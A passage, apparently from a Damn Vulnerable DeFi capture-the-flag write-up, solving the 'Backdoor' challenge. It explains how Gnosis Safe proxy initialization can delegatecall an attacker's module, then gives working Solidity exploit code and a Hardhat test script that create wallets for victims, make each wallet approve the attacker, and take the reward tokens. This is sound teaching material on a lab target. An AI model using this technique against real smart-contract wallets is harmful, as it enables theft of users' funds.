@@ -839,3 +839,124 @@ it('Exploit', async function () {
   });
 });
 ```
+
+## 11 - Backdoor
+
+This one's tough. I suggest you to do research about GnosisSafe wallets and proxy contracts before attempting or even reading this.
+So initially there is a team of 4 people using some kind of wallet registry (**WalletRegistry.sol**) that is used to create more secure wallets. As a reward, each team member will get 10 DVT tokens once they create their GnosisSafe wallet. **WalletRegistry.sol** just makes some security checks before handing them the tokens to wallet. It allows each team member to create wallet only once.
+
+The way this works is following. User has to create instance of **GnosisSafeProxy.sol** with **GnosisSafeProxyFactory.sol** contract. The logic implementation of the wallet is stored in a contract called **Singleton**. It's instance of **GnosisSafe.sol** contract and it's deployed only once for all GnosisSafe wallets. That's possible due to proxy desing pattern, so only thing that you deploy once you create the wallet is the **GnosisSafeProxy.sol** that will basically `delegatecall` to implementation contract (singleton) all function calls. State is stored in the proxy. Now this all might sound confusing and it should. It took me few hours of watching differnet videos and reading articles to fully grasp how it all works. Once you fully comprehent the desing of these contracts continue on because exploit is not easy to understand as well at first.
+
+There is a special functionality inside GnosisSafe contracts that allows you to add so called Modules on top of the wallet. It's made to allow more flexibility and functinality. But that's exactly where vulnerability comes in. The problem with this is that once we initialize the wallet, it allows you to delegatecall to arbitrary contract (module) with arbitrary data. What it means is that if you deploy your wallet through some malicous third party website, it can basically install a "backdoor" on your wallet and control your funds. For us this is not the exact exploit, but it's very similiar. Since no member of the team deployed a wallet, we can take advantage of it. We will initialize their wallets and approve us for wallet's DVT with our malicous module (because wallet will delegatecall our module), so once they receive it we can send it to us. This is the concept and explaination on a very high level, I will share the solution code below.
+
+We need to make new **BackdoorAttack.sol** module contract. It will have `setupTokens()` and `exploit()` functions. First one will be called with delegatecall once the wallet proxy is being initialized and second is the starting point of the exploit. That's the function we will call, it will loop through team and for each member it will deploy new wallet using `createProxyWithCallback()` function inside **GnosisSafeProxyFactory.sol**. That will initiate the callback that we specify (**WalletRegistry.sol** `proxyCreated()`) function. Once the wallet registry send the tokens we will just transfer them to us and that's the whole exploit.
+
+Solution code:
+
+**BackdoorAttack.sol**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../DamnValuableToken.sol";
+import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
+
+contract BackdoorAttack {
+    address public owner;
+    address public factory;
+    address public masterCopy;
+    address public walletRegistry;
+    address public token;
+
+    constructor(
+        address _owner,
+        address _factory,
+        address _masterCopy,
+        address _walletRegistry,
+        address _token
+    ) {
+        owner = _owner;
+        factory = _factory;
+        masterCopy = _masterCopy;
+        walletRegistry = _walletRegistry;
+        token = _token;
+    }
+
+    function setupToken(address _tokenAddress, address _attacker) external {
+        DamnValuableToken(_tokenAddress).approve(_attacker, 10 ether);
+    }
+
+    function exploit(address[] memory users, bytes memory setupData) external {
+        for (uint256 i = 0; i < users.length; i++) {
+            address user = users[i];
+            address[] memory victim = new address[](1);
+            victim[0] = user;
+
+            string
+                memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
+            bytes memory initGnosis = abi.encodeWithSignature(
+                signatureString,
+                victim,
+                uint256(1),
+                address(this),
+                setupData,
+                address(0),
+                address(0),
+                uint256(0),
+                address(0)
+            );
+
+            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory)
+                .createProxyWithCallback(
+                    masterCopy,
+                    initGnosis,
+                    123,
+                    IProxyCreationCallback(walletRegistry)
+                );
+
+            DamnValuableToken(token).transferFrom(
+                address(newProxy),
+                owner,
+                10 ether
+            );
+        }
+    }
+}
+```
+
+**backdoor.challenge.js**
+
+```js
+it('Exploit', async function () {
+  /** CODE YOUR EXPLOIT HERE */
+  const attackToken = this.token.connect(attacker);
+  const attackFactory = this.walletFactory.connect(attacker);
+  const attackMasterCopy = this.masterCopy.connect(attacker);
+  const attackWalletRegistry = this.walletRegistry.connect(attacker);
+
+  const AttackFactory = await ethers.getContractFactory(
+    'BackdoorAttack',
+    attacker
+  );
+  const attackContract = await AttackFactory.deploy(
+    attacker.address,
+    attackFactory.address,
+    attackMasterCopy.address,
+    attackWalletRegistry.address,
+    attackToken.address
+  );
+
+  const moduleABI = ['function setupToken(address,address)'];
+  const moduleIface = new ethers.utils.Interface(moduleABI);
+  const setupData = moduleIface.encodeFunctionData('setupToken', [
+    attackToken.address,
+    attackContract.address,
+  ]);
+
+  await attackContract.exploit(users, setupData);
+});
+```
